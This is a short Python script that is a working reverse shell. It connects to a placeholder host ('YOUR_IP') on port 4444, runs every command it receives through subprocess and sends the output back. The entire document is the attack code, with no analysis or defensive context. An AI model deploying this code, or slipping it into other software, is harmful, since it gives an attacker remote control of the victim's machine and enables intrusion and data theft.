
import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("YOUR_IP", 4444))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
        